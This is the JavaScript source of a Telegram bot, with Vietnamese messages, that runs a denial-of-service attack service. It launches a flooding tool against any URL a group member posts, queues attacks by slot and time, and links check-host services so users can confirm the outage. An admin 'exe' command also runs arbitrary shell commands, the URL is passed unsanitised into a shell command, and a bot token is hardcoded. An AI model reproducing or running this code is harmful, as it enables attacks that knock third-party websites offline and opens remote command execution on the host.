const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');

// ==================== CONFIG ====================
const token = '7935173392:AAFYFVwBtjee7R33I64gcB3CE_-veYkU4lU';
const adminId = 1243471275;
const allowedGroupIds = new Set([-1002423723717, 987654321, 112233445, 556677889, 998877665]);
const maxTime = 120, maxConcurrent = 3, maxSlot = 1;

const bot = new TelegramBot(token, { polling: true });
const processes = {
  users: new Map(), // Map<uid, { pid, start }>
  attacks: new Map(), // Map<pid, { uid, child }>
  queue: []
};

// ==================== CORE FUNCTIONS ====================
const createAttackData = (user, pid, host, time) => ({
  Status: "🚀 Successfully 🚀",
  Caller: user,
  "PID Attack": pid,
  Website: host,
  Time: `${time} Giây`,
  Maxslot: maxSlot,
  ConcurrentAttacks: processes.attacks.size + 1,
  StartTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }),
  CheckHostURL: `https://check-host.net/check-http?host=${encodeURIComponent(host)}`,
  HostTracker: `https://www.host-tracker.com/en/ic/check-http?url=${encodeURIComponent(host)}`
});

const sendAttackMessage = (chatId, data) => {
  const buttons = [
    [{ text: '🔍 Check Host', url: data.CheckHostURL }],
    [{ text: '📡 Host Tracker', url: data.HostTracker }]
  ];
  
  bot.sendMessage(chatId, '```json\n' + JSON.stringify(data, null, 2) + '\n```', {
    parse_mode: 'MarkdownV2',
    reply_markup: { inline_keyboard: buttons }
  });
};

const cleanupProcess = (pid, uid) => {
  processes.attacks.get(pid)?.child?.kill();
  processes.attacks.delete(pid);
  processes.users.delete(uid);
  processQueue();
};

const processQueue = () => {
  if (processes.attacks.size >= maxConcurrent || processes.queue.length === 0) return;
  
  const task = processes.queue.shift();
  executeAttack(task);
};

const executeAttack = ({ chatId, host, time, user, uid }) => {
  const pid = Date.now() % 1e6;
  const child = exec(`node ./negan -m GET -u "${host}" -p live.txt --full true -s ${time}`);
  
  // Send attack info
  sendAttackMessage(chatId, createAttackData(user, pid, host, time));
  
  // Track processes
  processes.attacks.set(pid, { uid, child });
  processes.users.set(uid, { pid, start: Date.now() });

  child
    .on('error', (e) => bot.sendMessage(chatId, `❌ Lỗi hệ thống:\n\`\`\`${e.message}\`\`\``, { parse_mode: 'MarkdownV2' }))
    .on('exit', () => {
      bot.sendMessage(chatId, `✅ Hoàn thành PID ${pid}\n⏰ Thời gian chạy: ${time}s`);
      cleanupProcess(pid, uid);
    });
};

// ==================== BOT HANDLERS ====================
bot.on('message', (msg) => {
  const { chat: { id: cid }, text, from: { id: uid, username: user = 'Unknown' } = {} } = msg;
  
  // Authorization check
  if (!allowedGroupIds.has(cid) return bot.sendMessage(cid, '🚫 Truy cập bị từ chối!');
  
  // Attack command
  if (text?.startsWith('http')) {
    const [host, time] = text.split(/\s+/g);
    const attackTime = Math.min(parseInt(time) || 0, maxTime);
    
    // Validation
    if (!host || !attackTime) return bot.sendMessage(cid, '⚠️ Sai cú pháp!\nVí dụ: https://example.com 60');
    
    // Slot check
    const userSlots = [...processes.users.keys()].filter(id => id === uid).length;
    if (userSlots >= maxSlot) return bot.sendMessage(cid, `⛔ Đạt giới hạn ${maxSlot} slot/người!`);

    // Queue/Execute
    const task = { chatId: cid, host, time: attackTime, user, uid };
    processes.attacks.size >= maxConcurrent 
      ? (processes.queue.push(task), bot.sendMessage(cid, '⏳ Lệnh đã được thêm vào hàng đợi')) 
      : executeAttack(task);
      
    return;
  }

  // Admin commands
  if (uid === adminId && text?.startsWith('exe ')) {
    return exec(text.slice(4), (err, stdout, stderr) => {
      const output = stdout || stderr || 'Không có output';
      bot.sendMessage(cid, '```\n' + (err?.message || output) + '\n```', { parse_mode: 'MarkdownV2' });
    });
  }

  bot.sendMessage(cid, '❌ Lệnh không hợp lệ!');
});

// Init bot
bot.sendMessage(adminId, '🛸 Bot đã sẵn sàng tấn công!');
